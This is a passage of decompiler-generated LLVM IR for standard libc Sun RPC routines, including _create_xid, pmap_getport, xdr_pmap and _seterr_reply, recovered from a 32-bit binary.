  %v4_80637a2 = icmp eq i32 %tmp, 0
  br i1 %v4_80637a2, label %dec_label_pc_80637f6, label %dec_label_pc_80637ab

dec_label_pc_80637ab:                             ; preds = %dec_label_pc_80637a2
  store i32 %v1_806334e, i32* %ecx.global-to-local, align 4
  %v1_80637b1 = inttoptr i32 %v1_806334e to i32*
  store i32 2, i32* %v1_80637b1, align 4
  %v1_80637b7 = load i32, i32* @esp, align 4
  %v2_80637b7 = add i32 %v1_80637b7, -4
  %v3_80637b7 = inttoptr i32 %v2_80637b7 to i32*
  store i32 %v2_806374a, i32* %v3_80637b7, align 4
  %v2_80637b8 = add i32 %v1_80637b7, -8
  %v3_80637b8 = inttoptr i32 %v2_80637b8 to i32*
  store i32 %v2_806374a, i32* %v3_80637b8, align 4
  %v2_80637b9 = add i32 %v1_80637b7, -12
  %v3_80637b9 = inttoptr i32 %v2_80637b9 to i32*
  store i32 %v2_8063437, i32* %v3_80637b9, align 4
  %v0_80637ba = load i32, i32* %ecx.global-to-local, align 4
  %v2_80637ba = add i32 %v1_80637b7, -16
  %v3_80637ba = inttoptr i32 %v2_80637ba to i32*
  store i32 %v0_80637ba, i32* %v3_80637ba, align 4
  %v0_80637bb = load i32, i32* %stack_var_-20, align 4
  %v2_80637bb = call i32 @xdr_opaque_auth(i32 %v0_80637bb, i32 %v0_80632af)
  store i32 %v2_80637bb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80637f6

dec_label_pc_80637c5:                             ; preds = %dec_label_pc_8063763
  %tmp129 = icmp slt i32 %stack_var_-9020.0, 1
  br i1 %tmp129, label %dec_label_pc_80637f6, label %dec_label_pc_80637ce

dec_label_pc_80637ce:                             ; preds = %dec_label_pc_80637c5
  store i32 %tmp107, i32* @ebx, align 4
  %v2_80637d4 = load i32, i32* %arg1, align 4
  store i32 %v2_80637d4, i32* %eax.global-to-local, align 4
  %v1_80637d6 = add i32 %v2_80637d4, 32
  %v2_80637d6 = inttoptr i32 %v1_80637d6 to i32*
  %v3_80637d6 = load i32, i32* %v2_80637d6, align 4
  store i32 %v3_80637d6, i32* %edx.global-to-local, align 4
  %v3_80637d9 = inttoptr i32 %v0_806376f to i32*
  store i32 %v2_80637d4, i32* %v3_80637d9, align 4
  %v1_80637da = add i32 %v0_806376f, -4
  %v2_80637da = inttoptr i32 %v1_80637da to i32*
  store i32 134625245, i32* %v2_80637da, align 4
  %v3_80637da = load i32, i32* %edx.global-to-local, align 4
  %v4_80637da = add i32 %v3_80637da, 12
  %v5_80637da = inttoptr i32 %v4_80637da to i32*
  %v6_80637da = load i32, i32* %v5_80637da, align 4
  call void @__pseudo_call(i32 %v6_80637da)
  %v1_80637e0 = icmp eq i32 %v2_80637d4, 0
  br i1 %v1_80637e0, label %dec_label_pc_80637f6, label %dec_label_pc_80637e4

dec_label_pc_80637e4:                             ; preds = %dec_label_pc_80637ce
  %v0_80637dd = load i32, i32* @esp, align 4
  %v1_80637dd = add i32 %v0_80637dd, 16
  %v4_80637e4 = add i32 %stack_var_-9020.0, -1
  %v0_806334e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806334a

dec_label_pc_80637ef:                             ; preds = %dec_label_pc_806373c
  %v0_80637ef = load i32, i32* @esi, align 4
  %v1_80637ef = add i32 %v0_80637ef, 44
  %v2_80637ef = inttoptr i32 %v1_80637ef to i32*
  store i32 2, i32* %v2_80637ef, align 4
  br label %dec_label_pc_80637f6

dec_label_pc_80637f6:                             ; preds = %dec_label_pc_80637ce, %dec_label_pc_80637c5, %dec_label_pc_80637a2, %dec_label_pc_80637ab, %dec_label_pc_80637ef
  %v0_80637f6 = load i32, i32* @esi, align 4
  %v1_80637f6 = add i32 %v0_80637f6, 44
  %v2_80637f6 = inttoptr i32 %v1_80637f6 to i32*
  %v3_80637f6 = load i32, i32* %v2_80637f6, align 4
  store i32 %v3_80637f6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80637f9

dec_label_pc_80637f9:                             ; preds = %dec_label_pc_806370e, %dec_label_pc_806357d, %dec_label_pc_80632ed, %dec_label_pc_80633c5, %dec_label_pc_80637f6
  %v0_8063800 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8063800

; uselistorder directives
  uselistorder i32 %v2_8063781, { 0, 2, 1, 3 }
  uselistorder i32 %v0_806376f, { 5, 6, 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_8063758, { 3, 0, 1, 2 }
  uselistorder i32 %v1_80636f1, { 1, 2, 0 }
  uselistorder i32 %v1_80636e8, { 1, 0 }
  uselistorder i32 %v6_80636e3, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v1_80636c7, { 0, 1, 2, 7, 6, 5, 4, 3 }
  uselistorder i32 %v0_80636bb, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8063308, { 1, 2, 0 }
  uselistorder i32 %v1_80636b1, { 3, 2, 1, 0 }
  uselistorder i32 %v0_806363c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8063624, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_80635cf, { 0, 3, 2, 1, 4 }
  uselistorder i32 %storemerge7.in.lcssa, { 1, 2, 0 }
  uselistorder i32 %v4_806354b, { 1, 0 }
  uselistorder i32 %v4_8063541, { 0, 2, 1 }
  uselistorder i32 %v1_80634f8, { 2, 1, 0 }
  uselistorder i32 %v3_80634f3, { 1, 2, 0 }
  uselistorder i32 %stack_var_-9016.3155, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8063493, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 %v0_8063475, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_8063470, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8063463, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-9028.2, { 2, 3, 5, 4, 1, 0 }
  uselistorder i32 %stack_var_-9008.2, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v1_806342f, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-9028.1, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_80633ef, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80633a9, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_8063398, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v0_806338e, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_806334e, { 1, 0, 2, 4, 5, 6, 7, 8, 3, 9 }
  uselistorder i32 %stack_var_-9020.0, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-9008.0, { 1, 0 }
  uselistorder i32 %stack_var_-9004.0, { 1, 0 }
  uselistorder i32 %stack_var_-9012.0, { 1, 0 }
  uselistorder i32 %stack_var_-9016.0, { 1, 0 }
  uselistorder i32 %v0_806335d, { 1, 0 }
  uselistorder i32 %v2_806374a, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 %v2_80635f6, { 2, 3, 4, 5, 0, 1 }
  uselistorder i1 %v4_806334a, { 1, 0 }
  uselistorder i32 %storemerge3, { 0, 4, 3, 2, 1 }
  uselistorder i32 %stack_var_-9000.0, { 1, 0, 2 }
  uselistorder i32 %v3_80632d3, { 2, 1, 0 }
  uselistorder i32 %v2_80632cb, { 1, 2, 0, 3 }
  uselistorder i32 %v3_80632be, { 1, 0, 2 }
  uselistorder i32 %v0_80632af, { 1, 2, 0 }
  uselistorder i32 %v0_80632ae, { 1, 0 }
  uselistorder i32 %v0_80632ad, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i16* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %tmp107, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 51, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 37, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 38, 39, 40, 41, 42, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 17, 43, 44, 45, 60, 59, 61, 62, 63 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 2, 4, 0, 1, 3 }
  uselistorder i32 -65536, { 1, 5, 3, 4, 2, 0 }
  uselistorder i32 ()* @bcmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32 8800, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 -28, { 3, 8, 0, 1, 9, 5, 4, 6, 10, 12, 2, 11, 7 }
  uselistorder i32 -24, { 0, 5, 9, 8, 6, 2, 1, 3, 7, 4 }
  uselistorder i64 1000, { 1, 0, 2 }
  uselistorder i32 1000, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80637f9, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80637f6, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80637a2, { 1, 0 }
  uselistorder label %dec_label_pc_806370e, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8063705, { 1, 0 }
  uselistorder label %dec_label_pc_80636c7, { 9, 8, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80636a1, { 1, 0 }
  uselistorder label %dec_label_pc_806353b, { 1, 0 }
  uselistorder label %dec_label_pc_80634d2, { 1, 0 }
  uselistorder label %dec_label_pc_8063463, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8063322, { 1, 0 }
}

define i32 @_create_xid() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8063804 = load i32, i32* @ebx, align 4
  store i32 %v0_8063804, i32* %stack_var_-4, align 4
  %v2_8063812 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8063812, i32* @ebx, align 4
  %v4_8063817 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_807e008.745 to i32))
  %v1_8063823 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807e008.745 to i32))
  %v0_806382b = load i8, i8* @global_var_807e020.746, align 32
  %v1_806382b = icmp eq i8 %v0_806382b, 0
  %v1_8063832 = icmp eq i1 %v1_806382b, false
  br i1 %v1_8063832, label %dec_label_pc_8063861, label %dec_label_pc_8063834

dec_label_pc_8063834:                             ; preds = %entry
  %v0_8063834 = load i32, i32* @ecx, align 4
  %v2_8063838 = ptrtoint i32* %stack_var_-16 to i32
  %v4_806383d = call i32 @gettimeofday(i32 %v2_8063838, i32 0, i32 %v0_8063834, i32 %v0_8063834)
  %v4_806384d = load i32, i32* %stack_var_-16, align 4
  %v5_806384d = xor i32 %v4_806384d, %tmp
  %v2_8063852 = trunc i32 %v5_806384d to i16
  %v3_8063852 = call i32 @__GI_srand48_r(i16 %v2_8063852, i32 ptrtoint (i32* @global_var_807e024.747 to i32))
  store i8 1, i8* @global_var_807e020.746, align 32
  br label %dec_label_pc_8063861

dec_label_pc_8063861:                             ; preds = %entry, %dec_label_pc_8063834
  %v2_8063861 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8063865 = load i32, i32* @ecx, align 4
  %v4_806386d = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_807e024.747 to i32), i32 %v2_8063861, i32 %v0_8063865, i32 %v0_8063865)
  %v3_8063877 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v3_806387c = load i32, i32* %stack_var_-8, align 4
  %v2_8063883 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8063883, i32* @ebx, align 4
  ret i32 %v3_806387c

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_807e024.747 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @gettimeofday, { 0, 2, 1 }
  uselistorder i8* @global_var_807e020.746, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_807e008.745 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8063861, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-14 = alloca i16, align 2
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8063888 = load i32, i32* @edi, align 4
  %v0_806388a = load i32, i32* @ebx, align 4
  store i32 %v0_806388a, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  store i16 0, i16* %stack_var_-14, align 2
  store i32 -1, i32* %stack_var_-20, align 4
  %v1_80638a1 = add i32 %arg1, 2
  %v2_80638a1 = inttoptr i32 %v1_80638a1 to i16*
  store i16 28416, i16* %v2_80638a1, align 2
  %v2_80638b1 = ptrtoint i32* %stack_var_-20 to i32
  %v0_80638c9 = load i32, i32* @edi, align 4
  %v9_80638ca = call i32 @__GI_clntudp_bufcreate(i32 %v0_80638c9, i32 100000, i32 2, i32 5, i32* null, i32 %v2_80638b1, i32 400, i32 400)
  %v1_80638d2 = icmp eq i32 %v9_80638ca, 0
  store i32 %v9_80638ca, i32* @ebx, align 4
  br i1 %v1_80638d2, label %dec_label_pc_8063965, label %dec_label_pc_8063958

dec_label_pc_8063958:                             ; preds = %entry
  %v0_80638dc = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_80638dc, i32* %esi.global-to-local, align 4
  %v0_806390b = load i32, i32* @ebx, align 4
  %v1_806390b = add i32 %v0_806390b, 4
  %v2_806390b = inttoptr i32 %v1_806390b to i32*
  %v3_806390b = load i32, i32* %v2_806390b, align 4
  store i32 %v3_806390b, i32* @ecx, align 4
  %v5_8063929 = inttoptr i32 %v3_806390b to i32*
  %v6_8063929 = load i32, i32* %v5_8063929, align 4
  call void @__pseudo_call(i32 %v6_8063929)
  %v0_8063932 = load i32, i32* %esi.global-to-local, align 4
  %v1_8063932 = inttoptr i32 %v0_8063932 to i32*
  store i32 14, i32* %v1_8063932, align 4
  %v0_806393a = load i32, i32* @ebx, align 4
  %v1_806393a = add i32 %v0_806393a, 4
  %v2_806393a = inttoptr i32 %v1_806393a to i32*
  %v3_806393a = load i32, i32* %v2_806393a, align 4
  %v5_8063942 = add i32 %v3_806393a, 8
  %v6_8063942 = inttoptr i32 %v5_8063942 to i32*
  %v7_8063942 = load i32, i32* %v6_8063942, align 4
  call void @__pseudo_call(i32 %v7_8063942)
  %v0_8063958 = load i32, i32* @ebx, align 4
  %v1_8063958 = add i32 %v0_8063958, 4
  %v2_8063958 = inttoptr i32 %v1_8063958 to i32*
  %v3_8063958 = load i32, i32* %v2_8063958, align 4
  %v5_806395f = add i32 %v3_8063958, 16
  %v6_806395f = inttoptr i32 %v5_806395f to i32*
  %v7_806395f = load i32, i32* %v6_806395f, align 4
  call void @__pseudo_call(i32 %v7_806395f)
  br label %dec_label_pc_8063965

dec_label_pc_8063965:                             ; preds = %entry, %dec_label_pc_8063958
  %v0_8063965 = load i32, i32* @edi, align 4
  %v1_8063965 = add i32 %v0_8063965, 2
  %v2_8063965 = inttoptr i32 %v1_8063965 to i16*
  store i16 0, i16* %v2_8063965, align 2
  %v3_806396b = load i16, i16* %stack_var_-14, align 2
  %v4_806396b = sext i16 %v3_806396b to i32
  %v2_8063973 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063973, i32* @ebx, align 4
  store i32 %v0_8063888, i32* @edi, align 4
  ret i32 %v4_806396b

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i16* %stack_var_-14, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8063965, { 1, 0 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %v0_8063978 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v2_8063987 = inttoptr i32 %arg1 to i32*
  %v3_8063987 = call i32 @xdr_u_long(i32* %v2_8063987, i32 %arg2)
  %v1_806398f = icmp eq i32 %v3_8063987, 0
  br i1 %v1_806398f, label %dec_label_pc_80639cc, label %dec_label_pc_8063993

dec_label_pc_8063993:                             ; preds = %entry
  %v0_8063995 = load i32, i32* @ebx, align 4
  %v1_8063995 = add i32 %v0_8063995, 4
  store i32 %v1_8063995, i32* @eax, align 4
  %v0_8063999 = load i32, i32* %esi.global-to-local, align 4
  %v2_806399a = inttoptr i32 %v0_8063999 to i32*
  %v3_806399a = call i32 @xdr_u_long(i32* %v2_806399a, i32 %v1_8063995)
  %v1_80639a2 = icmp eq i32 %v3_806399a, 0
  br i1 %v1_80639a2, label %dec_label_pc_80639cc, label %dec_label_pc_80639a6

dec_label_pc_80639a6:                             ; preds = %dec_label_pc_8063993
  %v0_80639a8 = load i32, i32* @ebx, align 4
  %v1_80639a8 = add i32 %v0_80639a8, 8
  store i32 %v1_80639a8, i32* @eax, align 4
  %v0_80639ac = load i32, i32* %esi.global-to-local, align 4
  %v2_80639ad = inttoptr i32 %v0_80639ac to i32*
  %v3_80639ad = call i32 @xdr_u_long(i32* %v2_80639ad, i32 %v1_80639a8)
  %v1_80639b5 = icmp eq i32 %v3_80639ad, 0
  br i1 %v1_80639b5, label %dec_label_pc_80639cc, label %dec_label_pc_80639b9

dec_label_pc_80639b9:                             ; preds = %dec_label_pc_80639a6
  %v0_80639b9 = load i32, i32* @ebx, align 4
  %v1_80639b9 = add i32 %v0_80639b9, 12
  store i32 %v1_80639b9, i32* @eax, align 4
  %v0_80639bc = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8063978, i32* %esi.global-to-local, align 4
  %v2_80639c7 = inttoptr i32 %v0_80639bc to i32*
  %v3_80639c7 = call i32 @xdr_u_long(i32* %v2_80639c7, i32 %v1_80639b9)
  br label %dec_label_pc_80639cc

dec_label_pc_80639cc:                             ; preds = %dec_label_pc_80639a6, %dec_label_pc_8063993, %entry, %dec_label_pc_80639b9
  store i32 %v0_8063978, i32* %esi.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8063978, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80639cc, { 3, 0, 1, 2 }
}

define i32 @__GI__seterr_reply() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  store i32 %tmp, i32* %edx.global-to-local, align 4
  %v1_80639dc = add i32 %tmp2, 8
  %v2_80639dc = inttoptr i32 %v1_80639dc to i32*
  %v3_80639dc = load i32, i32* %v2_80639dc, align 4
  store i32 %v3_80639dc, i32* %eax.global-to-local, align 4
  %v1_80639df = icmp eq i32 %v3_80639dc, 0
  br i1 %v1_80639df, label %dec_label_pc_80639ec, label %dec_label_pc_80639e3

dec_label_pc_80639e3:                             ; preds = %entry
  %v1_80639e3 = add i32 %v3_80639dc, -1
  %v8_80639e3 = icmp eq i32 %v1_80639e3, 0
  store i32 %v1_80639e3, i32* %eax.global-to-local, align 4
  %v1_80639e4 = icmp eq i1 %v8_80639e3, false
  br i1 %v1_80639e4, label %dec_label_pc_8063a74, label %dec_label_pc_8063a45

dec_label_pc_80639ec:                             ; preds = %entry
  %v1_80639ec = add i32 %tmp2, 24
  %v2_80639ec = inttoptr i32 %v1_80639ec to i32*
  %v3_80639ec = load i32, i32* %v2_80639ec, align 4
  store i32 %v3_80639ec, i32* %eax.global-to-local, align 4
  %v1_80639ef = icmp eq i32 %v3_80639ec, 0
  %v1_80639f1 = icmp eq i1 %v1_80639ef, false
  br i1 %v1_80639f1, label %dec_label_pc_80639fa, label %dec_label_pc_80639f3

dec_label_pc_80639f3:                             ; preds = %dec_label_pc_80639ec
  %v1_80639f3 = inttoptr i32 %tmp to i32*
  store i32 0, i32* %v1_80639f3, align 4
  %v0_80639f9 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80639f9

dec_label_pc_80639fa:                             ; preds = %dec_label_pc_80639ec
  switch i32 %tmp2, label %dec_label_pc_8063a36 [
    i32 0, label %dec_label_pc_8063a2e
    i32 1, label %dec_label_pc_8063a06
    i32 2, label %dec_label_pc_8063a0e
    i32 3, label %dec_label_pc_8063a16
    i32 4, label %dec_label_pc_8063a1e
    i32 5, label %dec_label_pc_8063a26
  ]

dec_label_pc_8063a06:                             ; preds = %dec_label_pc_80639fa
  %v1_8063a06 = inttoptr i32 %tmp to i32*
  store i32 8, i32* %v1_8063a06, align 4
  br label %dec_label_pc_8063a80

dec_label_pc_8063a0e:                             ; preds = %dec_label_pc_80639fa
  %v1_8063a0e = inttoptr i32 %tmp to i32*
  store i32 9, i32* %v1_8063a0e, align 4
  br label %dec_label_pc_8063a80

dec_label_pc_8063a16:                             ; preds = %dec_label_pc_80639fa
  %v1_8063a16 = inttoptr i32 %tmp to i32*
  store i32 10, i32* %v1_8063a16, align 4
  br label %dec_label_pc_8063a80

dec_label_pc_8063a1e:                             ; preds = %dec_label_pc_80639fa
  %v1_8063a1e = inttoptr i32 %tmp to i32*
  store i32 11, i32* %v1_8063a1e, align 4
  br label %dec_label_pc_8063a80

dec_label_pc_8063a26:                             ; preds = %dec_label_pc_80639fa
  %v1_8063a26 = inttoptr i32 %tmp to i32*
  store i32 12, i32* %v1_8063a26, align 4
  br label %dec_label_pc_8063a80

dec_label_pc_8063a2e:                             ; preds = %dec_label_pc_80639fa
  %v1_8063a2e = inttoptr i32 %tmp to i32*
  store i32 0, i32* %v1_8063a2e, align 4
  br label %dec_label_pc_8063a80

dec_label_pc_8063a36:                             ; preds = %dec_label_pc_80639fa
  %v1_8063a36 = inttoptr i32 %tmp to i32*
  store i32 16, i32* %v1_8063a36, align 4
  %v0_8063a3c = load i32, i32* %edx.global-to-local, align 4
  %v1_8063a3c = add i32 %v0_8063a3c, 4
  %v2_8063a3c = inttoptr i32 %v1_8063a3c to i32*
  store i32 0, i32* %v2_8063a3c, align 4
  br label %dec_label_pc_8063a6f

dec_label_pc_8063a45:                             ; preds = %dec_label_pc_80639e3
  %v1_8063a45 = add i32 %tmp2, 12
  %v2_8063a45 = inttoptr i32 %v1_8063a45 to i32*
  %v3_8063a45 = load i32, i32* %v2_8063a45, align 4
  store i32 %v3_8063a45, i32* %eax.global-to-local, align 4
  %v9_8063a48 = icmp eq i32 %v3_8063a45, 1
  br i1 %v9_8063a48, label %dec_label_pc_8063a5a, label %dec_label_pc_8063a4d

dec_label_pc_8063a4d:                             ; preds = %dec_label_pc_8063a45
  %v9_8063a4d = icmp eq i32 %v3_8063a45, 6
  %v1_8063a50 = icmp eq i1 %v9_8063a4d, false
  %v1_8063a62 = inttoptr i32 %tmp to i32*
  br i1 %v1_8063a50, label %dec_label_pc_8063a62, label %dec_label_pc_8063a52

dec_label_pc_8063a52:                             ; preds = %dec_label_pc_8063a4d
  store i32 6, i32* %v1_8063a62, align 4
  br label %dec_label_pc_8063a80

dec_label_pc_8063a5a:                             ; preds = %dec_label_pc_8063a45
  %v1_8063a5a = inttoptr i32 %tmp to i32*
  store i32 7, i32* %v1_8063a5a, align 4
  br label %dec_label_pc_8063a80

dec_label_pc_8063a62:                             ; preds = %dec_label_pc_8063a4d
  store i32 16, i32* %v1_8063a62, align 4
  %v0_8063a68 = load i32, i32* %edx.global-to-local, align 4
  %v1_8063a68 = add i32 %v0_8063a68, 4
  %v2_8063a68 = inttoptr i32 %v1_8063a68 to i32*
  store i32 1, i32* %v2_8063a68, align 4
  br label %dec_label_pc_8063a6f

dec_label_pc_8063a6f:                             ; preds = %dec_label_pc_8063a36, %dec_label_pc_8063a62
  %v0_8063a6f = load i32, i32* %eax.global-to-local, align 4
  %v1_8063a6f = load i32, i32* %edx.global-to-local, align 4
  %v2_8063a6f = add i32 %v1_8063a6f, 8
  %v3_8063a6f = inttoptr i32 %v2_8063a6f to i32*
  store i32 %v0_8063a6f, i32* %v3_8063a6f, align 4
  br label %dec_label_pc_8063a80

dec_label_pc_8063a74:                             ; preds = %dec_label_pc_80639e3
  %v1_8063a74 = inttoptr i32 %tmp to i32*
  store i32 16, i32* %v1_8063a74, align 4
  %v0_8063a7a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8063a7a = add i32 %v0_8063a7a, 8
  %v2_8063a7a = inttoptr i32 %v1_8063a7a to i32*
  %v3_8063a7a = load i32, i32* %v2_8063a7a, align 4
  store i32 %v3_8063a7a, i32* %eax.global-to-local, align 4
  %v1_8063a7d = load i32, i32* %edx.global-to-local, align 4
  %v2_8063a7d = add i32 %v1_8063a7d, 4
  %v3_8063a7d = inttoptr i32 %v2_8063a7d to i32*
  store i32 %v3_8063a7a, i32* %v3_8063a7d, align 4
  br label %dec_label_pc_8063a80

dec_label_pc_8063a80:                             ; preds = %dec_label_pc_8063a2e, %dec_label_pc_8063a26, %dec_label_pc_8063a1e, %dec_label_pc_8063a16, %dec_label_pc_8063a0e, %dec_label_pc_8063a06, %dec_label_pc_8063a6f, %dec_label_pc_8063a5a, %dec_label_pc_8063a52, %dec_label_pc_8063a74
  %v0_8063a80 = load i32, i32* %edx.global-to-local, align 4
  %v1_8063a80 = inttoptr i32 %v0_8063a80 to i32*
  %v2_8063a80 = load i32, i32* %v1_8063a80, align 4
  store i32 %v2_8063a80, i32* %eax.global-to-local, align 4
  %v9_8063a82 = icmp eq i32 %v2_8063a80, 7
  br i1 %v9_8063a82, label %dec_label_pc_8063a9e, label %dec_label_pc_8063a87

dec_label_pc_8063a87:                             ; preds = %dec_label_pc_8063a80
  %v9_8063a87 = icmp eq i32 %v2_8063a80, 9
  br i1 %v9_8063a87, label %dec_label_pc_8063aa5, label %dec_label_pc_8063a8c

dec_label_pc_8063a8c:                             ; preds = %dec_label_pc_8063a87
  %v9_8063a8c = icmp eq i32 %v2_8063a80, 6
  %v1_8063a8f = icmp eq i1 %v9_8063a8c, false
  br i1 %v1_8063a8f, label %dec_label_pc_8063ab1, label %dec_label_pc_8063a91

dec_label_pc_8063a91:                             ; preds = %dec_label_pc_8063a8c
  %v0_8063a91 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8063a91 = add i32 %v0_8063a91, 16
  %v2_8063a91 = inttoptr i32 %v1_8063a91 to i32*
  %v3_8063a91 = load i32, i32* %v2_8063a91, align 4
  store i32 %v3_8063a91, i32* %eax.global-to-local, align 4
  %v2_8063a94 = add i32 %v0_8063a80, 4
  %v3_8063a94 = inttoptr i32 %v2_8063a94 to i32*
  store i32 %v3_8063a91, i32* %v3_8063a94, align 4
  %v0_8063a97 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8063a97 = add i32 %v0_8063a97, 20
  %v2_8063a97 = inttoptr i32 %v1_8063a97 to i32*
  %v3_8063a97 = load i32, i32* %v2_8063a97, align 4
  store i32 %v3_8063a97, i32* %eax.global-to-local, align 4
  %v1_8063a9a = load i32, i32* %edx.global-to-local, align 4
  %v2_8063a9a = add i32 %v1_8063a9a, 8
  %v3_8063a9a = inttoptr i32 %v2_8063a9a to i32*
  store i32 %v3_8063a97, i32* %v3_8063a9a, align 4
  ret i32 %v3_8063a97

dec_label_pc_8063a9e:                             ; preds = %dec_label_pc_8063a80
  %v0_8063a9e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8063a9e = add i32 %v0_8063a9e, 16
  %v2_8063a9e = inttoptr i32 %v1_8063a9e to i32*
  %v3_8063a9e = load i32, i32* %v2_8063a9e, align 4
  store i32 %v3_8063a9e, i32* %eax.global-to-local, align 4
  %v2_8063aa1 = add i32 %v0_8063a80, 4
  %v3_8063aa1 = inttoptr i32 %v2_8063aa1 to i32*
  store i32 %v3_8063a9e, i32* %v3_8063aa1, align 4
  ret i32 %v3_8063a9e

dec_label_pc_8063aa5:                             ; preds = %dec_label_pc_8063a87
  %v0_8063aa5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8063aa5 = add i32 %v0_8063aa5, 28
  %v2_8063aa5 = inttoptr i32 %v1_8063aa5 to i32*
  %v3_8063aa5 = load i32, i32* %v2_8063aa5, align 4
  store i32 %v3_8063aa5, i32* %eax.global-to-local, align 4
  %v2_8063aa8 = add i32 %v0_8063a80, 4
  %v3_8063aa8 = inttoptr i32 %v2_8063aa8 to i32*
  store i32 %v3_8063aa5, i32* %v3_8063aa8, align 4
  %v0_8063aab = load i32, i32* %ecx.global-to-local, align 4
  %v1_8063aab = add i32 %v0_8063aab, 32
  %v2_8063aab = inttoptr i32 %v1_8063aab to i32*
  %v3_8063aab = load i32, i32* %v2_8063aab, align 4
  store i32 %v3_8063aab, i32* %eax.global-to-local, align 4
  %v1_8063aae = load i32, i32* %edx.global-to-local, align 4
  %v2_8063aae = add i32 %v1_8063aae, 8
  %v3_8063aae = inttoptr i32 %v2_8063aae to i32*
  store i32 %v3_8063aab, i32* %v3_8063aae, align 4
  %v0_8063ab1.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063ab1

